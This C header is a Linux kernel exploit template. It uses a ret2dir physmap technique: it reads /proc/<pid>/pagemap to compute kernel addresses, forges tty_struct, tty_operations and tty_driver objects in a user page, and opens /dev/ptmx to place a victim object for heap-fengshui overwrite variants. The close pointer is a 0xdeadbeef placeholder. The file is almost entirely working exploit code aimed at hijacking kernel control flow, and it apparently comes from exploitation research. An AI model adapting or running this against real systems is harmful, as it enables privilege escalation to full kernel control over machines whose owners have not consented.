#ifndef _TTY_PRIVATE_FILE_TMPL_H_
#define _TTY_PRIVATE_FILE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#define KMALLOC_SIZE 32

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

#ifdef FENGSHUI1

struct tty_file_private {
	char* tty;
    char hole1[0x18];
};

struct tty_struct {
	int magic;
	char hole1[0xc];
	char* driver;
	char* ops;
	char hole2[0x250];
	char* list_head_next;
	char hole3[0x40];
	char* port;
};

struct tty_operations {
	char hole1[0x20];
	char* close;
	char hole2[0xd8];
};

struct tty_driver {
	char hole1[0x34];
	unsigned num;
	char hole2[0x30];
	unsigned long flags;
	char hole3[0x48];
};

struct tty_file_private fake_tty_file_private;
struct tty_struct fake_tty_struct;
struct tty_operations fake_tty_operations;
struct tty_driver fake_tty_driver;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x8;

void* victim_obj = (void*)&fake_tty_file_private;

uint64_t kaddr = 0x0;

void do_setup_physmap() {

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
        memset(&fake_tty_file_private, 0x00, sizeof(struct tty_file_private));
        fake_tty_file_private.tty= (void*)kaddr;

        memset(&fake_tty_struct, 0x00, sizeof(struct tty_struct));
		fake_tty_struct.magic = 0x5401;
		fake_tty_struct.driver = (void*)(kaddr+sizeof(struct tty_struct)+sizeof(struct tty_operations));
        fake_tty_struct.ops= (void*)(kaddr+sizeof(struct tty_struct));
		fake_tty_struct.list_head_next = (void*)(kaddr+0x270);
		fake_tty_struct.port = (void*)kaddr;

        memset(&fake_tty_operations, 0x00, sizeof(struct tty_operations));
        fake_tty_operations.close = (void*)0xffffffffdeadbeef;

        memset(&fake_tty_driver, 0x00, sizeof(struct tty_driver));
		fake_tty_driver.flags = 0x0010;
		fake_tty_driver.num = 0x10;

        memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
        memcpy((void*)USER_ADDR, &fake_tty_struct, sizeof(struct tty_struct));
        memcpy((void*)(USER_ADDR+sizeof(struct tty_struct)), &fake_tty_operations, sizeof(struct tty_operations));
        memcpy((void*)(USER_ADDR+sizeof(struct tty_struct)+sizeof(struct tty_operations)), &fake_tty_driver, sizeof(struct tty_driver));

    }
    return;
err:
    close(fd);
    exit(-1);
}

uint64_t r[8] = {0x0,
                 0x0,
                 0xffffffffffffffff,
                 0x0,
                 0x0,
                 0xffffffffffffffff,
                 0xffffffffffffffff,
                 0x0};

void do_alloc_victim() {
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;

  memcpy((void*)0x20000340, "/dev/ptmx", 10);
  res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000340, 0, 0);
  if (res != -1)
    r[6] = res;
}

void do_hijack() {
}

#endif // FENGSHUI1


#ifdef FENGSHUI4

struct tty_file_private {
	char* tty;
    char hole1[0x18];
};

struct tty_struct {
	int magic;
	char hole1[0xc];
	char* driver;
	char* ops;
	char hole2[0x250];
	char* list_head_next;
	char hole3[0x40];
	char* port;
};

struct tty_operations {
	char hole1[0x20];
	char* close;
	char hole2[0xd8];
};

struct tty_driver {
	char hole1[0x34];
	unsigned num;
	char hole2[0x30];
	unsigned long flags;
	char hole3[0x48];
};

struct tty_file_private fake_tty_file_private;
struct tty_struct fake_tty_struct;
struct tty_operations fake_tty_operations;
struct tty_driver fake_tty_driver;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x8;

void* victim_obj = (void*)&fake_tty_file_private;

uint64_t kaddr = 0;

void do_setup_physmap() {

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
        memset(&fake_tty_file_private, 0x00, sizeof(struct tty_file_private));
        fake_tty_file_private.tty= (void*)(kaddr + 
									sizeof(struct tty_file_private));

        memset(&fake_tty_struct, 0x00, sizeof(struct tty_struct));
		fake_tty_struct.magic = 0x5401;
		fake_tty_struct.driver = (void*)(kaddr +
									sizeof(struct tty_file_private) + 
									sizeof(struct tty_struct) +
									sizeof(struct tty_operations));

        fake_tty_struct.ops= (void*)(kaddr + 
									sizeof(struct tty_file_private) +
									sizeof(struct tty_struct));

		fake_tty_struct.list_head_next = (void*)(kaddr +
									sizeof(struct tty_file_private) +
									0x270);
		fake_tty_struct.port = (void*)kaddr;

        memset(&fake_tty_operations, 0x00, sizeof(struct tty_operations));
        fake_tty_operations.close = (void*)0xffffffffdeadbeef;

        memset(&fake_tty_driver, 0x00, sizeof(struct tty_driver));
		fake_tty_driver.flags = 0x0010;
		fake_tty_driver.num = 0x10;

        memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
        memcpy((void*)USER_ADDR + 
				sizeof(struct tty_file_private), 
				&fake_tty_struct, sizeof(struct tty_struct));

        memcpy((void*)(USER_ADDR + 
				sizeof(struct tty_file_private) +
				sizeof(struct tty_struct)), 
				&fake_tty_operations, sizeof(struct tty_operations));

        memcpy((void*)(USER_ADDR + 
				sizeof(struct tty_file_private) +
				sizeof(struct tty_struct) + 
				sizeof(struct tty_operations)), &fake_tty_driver, sizeof(struct tty_driver));

    }
    return;
err:
    close(fd);
    exit(-1);
}

uint64_t r[8] = {0x0,
                 0x0,
                 0xffffffffffffffff,
                 0x0,
                 0x0,
                 0xffffffffffffffff,
                 0xffffffffffffffff,
                 0x0};

extern void do_defragment();
void do_alloc_step() {
	do_defragment(KMALLOC_SIZE, 1);
}

void do_alloc_victim() {
  do_alloc_step();
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;

  memcpy((void*)0x20000340, "/dev/ptmx", 10);
  res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000340, 0, 0);
  if (res != -1)
    r[6] = res;
}

void do_hijack() {
	memcpy((void*)USER_ADDR, &fake_tty_file_private, sizeof(struct tty_file_private));
}

#endif

#endif
